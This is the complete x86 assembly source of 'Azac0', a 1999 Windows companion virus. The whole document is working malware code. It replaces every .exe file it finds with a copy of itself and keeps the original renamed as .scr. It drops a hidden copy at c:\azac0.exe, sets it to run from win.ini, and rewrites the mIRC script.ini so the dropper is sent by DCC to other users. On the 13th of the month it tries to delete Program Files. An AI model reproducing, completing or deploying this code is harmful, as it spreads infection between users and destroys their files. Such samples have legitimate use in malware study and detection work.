; Virus Name  : Azac0
; Author      : ULTRAS
; Created     : 15 September 1999
; Targets     : ALL EXE files (PE,D0S,NE)
; Platforms   : Win95/98/NT
; Version     : 1.0
; Type        : Companion
; Encrypted   : No
; Payload     : Yes
;
; Description :
;           Find *.exe files, renames them too .scr it then copys
;               the virus code to the original exe. When start the virus 
;               it searches for file with such name only exe and execute 
;               its. Create virus dr0per on c:\azac0.exe, delete script.ini
;       on c:\mirc directory and create new script.ini and write 
;       script code. Write some parameters on win.ini.
;
; Thanx       : Greater thank you Techno Phunk for help, but in the same 
;               way Myrkry for companion method help, int13 for a certain 
;               code of helps.


%out
%out Azaco, copyright (c) 1999 by [U]
%out
.386
.model flat
locals
; declaration of all used API-functions
extrn FindFirstFileA:proc
extrn FindNextFileA:proc
extrn SetCurrentDirectoryA:proc
extrn SetFileAttributesA:proc
extrn GetCurrentDirectoryA:proc
extrn GetWindowsDirectoryA:proc
extrn WritePrivateProfileStringA:proc
extrn GetSystemTime:proc
extrn MoveFileA:proc
extrn CopyFileA:proc
extrn GetCommandLineA:proc
extrn CreateProcessA:proc
extrn lstrcpyA:proc
extrn lstrcat:proc
extrn MessageBoxA:proc
extrn ExitProcess:proc
extrn CreateFileA:proc
extrn CloseHandle:proc
extrn WriteFile:proc
extrn DeleteFileA:proc
extrn RemoveDirectoryA:proc
; here begins our data
.data
exe db '*.EXE',0 ; name of file to search
fhandle dd 0 ; file handle
nashandle dd 0 ; file handle
processi dd 4 dup (0) ; PROCESS_INFORMATION
startupi dd 4 dup (0) ; STARTUPINFO
win32_fdata dd 0,0,0,0,0,0,0,0,0,0,0
;filename,attributes,size and more
viro db 260 dup (0) ; buffer
nujno db 260 dup (0) ; buffer
nashv db 260 dup (0) ; buffer 
nastoeh db 260 dup (0) ; buffer 
pazwinini db 260 dup (0) ; buffer
winini db "\WIN.INI",0  ; win.ini file
diiri db 260 dup (0) ; buffer
windoze db "windows",0  ; windows section on win.ini
zapuskz db "run", 0 ; run parameters
dot db '..',0 ; setdir '..'
time: ; get time
ayear dw 0 ; year
amonth dw 0 ; month
adayofweek dw 0 ;day of week
aday dw 0 ; day
ahour dw 0 ; hour
aminute dw 0 ;minute
asecond dw 0 ; seconde
amilliseconds dw 0 ; milliseconds
;year,month,dayofweek,day etc...
azas db 260 dup (0) ; buffer
mirc db 'c:\mirc\script.ini',00h ; mirc script file
num_bytes_written dd ? ; number of bytes write
size dd ?
title_ db '[azaco] virus by ULTRAS',0 ; virus name
msg   db 'Кто ненавидит войну, тот в плену',00h
; mesage box
filehandle dd 0 ;file handle
scriptini db "[script]",13,10   ; script parameters
db "n0=ON 1:JOIN:#: {/if ($nick==$me) { halt }",13,10
db "n1=/dcc send $nick c:\azac0.exe",13,10
db "n2=}",13,10
db "n3=ON 1:TEXT:*azac0*:#:/quit AZAC0!!!",13,10
db "n4=ON 1:TEXT:*virus*:#:/ignore -u666 $nick",13,10
db "n5=ON 1:CONNECT: {",13,10
db "n6=}",13,10
scriptsize equ ($-offset scriptini)
.code ; virus code start here
aza db 'c:\azaco.exe',0  ; dr0peerr
@prg db 'c:\Program Files',0
; kill program files
azaco:
push offset nastoeh
push 260
call GetCurrentDirectoryA
mov dword ptr [nashandle],eax
call GetCommandLineA ; get command line
push eax ;eax = command-line
push offset nashv
call lstrcpyA
mov edi,eax
search: 
cmp byte ptr [edi],'.' ; found dot in filename?
jz found_d ; zero? jmp found_d
inc edi
jmp search ; jump search 
found_d:
mov esi,edi
inc esi
add edi,4
mov byte ptr [edi],00 ; store zero at end of filename
infect:
call inf        ; find procedure
push offset dot     ; setdir '..'
call SetCurrentDirectoryA
push offset diiri   ; getdir
push 260 ; size directory buffer
call GetCurrentDirectoryA
cmp eax,dword ptr [nashandle]
je setdir ; equal? jmp setdir
mov dword ptr [nashandle],eax
jmp infect ; jump infect
inf:            ; find first exe file
push offset win32_fdata ; win32_find_data
push offset exe    ; handle of search
call FindFirstFileA
mov dword ptr [fhandle],eax ; save filename
proverim: 
cmp eax,-1 ;cant find exe file
je setdir  ; equal? jump to setdir
or eax,eax
jnz infect_f ; infect
ret
infect_f: ; infect file
push offset viro
push offset nujno
call lstrcpyA
mov edi,offset nujno
search_z:
cmp byte ptr [edi],'.'
jz mojet ; zero? jmp mojet
inc edi
jmp search_z ; jump search_z
mojet:
inc edi
mov dword ptr [edi],'rcs'
push offset nujno
push offset viro
call MoveFileA   ;rename original.exe - original.scr
push 0
push offset viro ; copy active virus original.exe
push offset nashv+1
call CopyFileA                        
push offset win32_fdata ; find next *.exe file
push dword ptr [fhandle]
call FindNextFileA
jmp proverim ; jump proverim
mircdrop:
push offset time ; check time
call GetSystemTime
cmp byte ptr [aday],13d ; 13?
je payload ; equal? jmp payload
drop:
push 0  ; coping active file to c:\azac0.exe
push offset aza ; droper c:\azac0.exe
push offset nashv+1 ; active file
call CopyFileA
push 00000001h OR 00000002h 
lea  eax,aza ; set attribute droper c:\azac0.exe
push eax    ;set attribute hide and system
call SetFileAttributesA
lea  eax,mirc   ; delete c:\mirc\script.ini
push eax
call DeleteFileA
push 0
push 00000080h 
push 2
push 0  ; create c:\mirc\script.ini
push 1
push 80000000h + 40000000h ; read+write
push offset mirc
call CreateFileA
mov  dword ptr [filehandle],eax ; save mirc handle
push 0
push offset num_bytes_written ; write virus script code
push scriptsize ; script size
push offset scriptini ; script
push dword ptr [filehandle] ; mirc handle
call WriteFile
push offset mirc ; close mirc handle
call CloseHandle
push 260 ; buffer
push offset pazwinini
call GetWindowsDirectoryA ; get windoze directory
push offset winini ; win.ini file
push offset pazwinini ; windoze dir 
call lstrcat ; copy
push offset pazwinini ; write win.ini
push offset aza ; write win.ini way dr0peerr
push offset zapuskz ; write parameters run section 
push offset windoze ; write windows section
call WritePrivateProfileStringA
jmp runz ; jump runz
payload:   ; virus payload
push offset @prg ; kill program files directory
call RemoveDirectoryA
push 10h
push offset title_ ; title box
push offset msg ; message box
push 0 
call MessageBoxA
setdir: 
push offset nastoeh
call SetCurrentDirectoryA
jmp mircdrop ; jump mircdrop
runz: ; run the host_name file
push offset processi
push offset startupi
sub eax,eax ; zer0
push eax ; current directory name
push eax ; null enviroment block
push 10h ; run host
push eax ; inheritance flag
push eax
push eax
call GetCommandLineA
inc eax
push eax
mov dword ptr [esi],'rcs' ; store file extension
push offset nashv+1
call CreateProcessA ; execute scr file
push 0 ; exit
call ExitProcess
ends
end azaco
